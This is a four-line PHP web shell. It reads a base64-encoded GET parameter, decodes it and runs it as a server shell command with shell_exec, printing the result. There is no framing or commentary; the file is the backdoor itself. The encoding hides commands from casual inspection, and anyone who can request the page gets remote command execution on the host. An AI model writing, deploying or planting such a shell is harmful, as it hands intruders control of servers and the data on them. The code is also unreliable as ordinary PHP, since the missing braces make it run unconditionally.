<?php
if ($_GET['a'])
  $a = escapeshellarg(urldecode(base64_decode($_GET['a'])));
  print_r(shell_exec($a));
